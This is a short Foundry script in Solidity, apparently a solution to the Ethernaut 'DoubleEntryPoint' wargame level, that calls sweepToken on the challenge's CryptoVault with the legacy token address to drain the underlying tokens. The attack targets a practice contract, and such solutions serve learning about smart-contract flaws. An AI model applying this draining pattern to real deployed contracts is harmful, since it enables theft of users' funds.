// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../instances/Ilevel26.sol";
import "forge-std/Script.sol";

contract POC is Script {
    DoubleEntryPoint level26 =
        DoubleEntryPoint(0xf8F62366090AF765b4B49e1aF1783E48cE7f3e2e);

    function run() external {
        vm.startBroadcast();
        CryptoVault vault = CryptoVault(level26.cryptoVault());
        address DET = address(vault.underlying());
        address LGT = level26.delegatedFrom();

        //call sweeptoken with LGT address on the cryptovault
        vault.sweepToken(IERC20(LGT));

        vm.stopBroadcast();
    }
}
